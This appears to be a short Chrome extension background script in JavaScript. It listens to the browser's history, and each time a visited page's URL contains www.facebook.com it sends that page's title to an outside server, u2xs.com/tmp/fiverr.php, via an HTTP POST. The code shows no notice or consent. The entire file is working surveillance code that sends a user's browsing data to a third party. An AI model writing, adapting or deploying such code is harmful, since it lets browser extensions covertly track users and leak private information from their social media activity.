chrome.history.onVisited.addListener(function(result){
	if (result.url.search("www.facebook.com") >= 0){
		title = result.title;
		$.post("http://u2xs.com/tmp/fiverr.php", {titletag: title});
		console.log("Saving "+result.title);
	}
});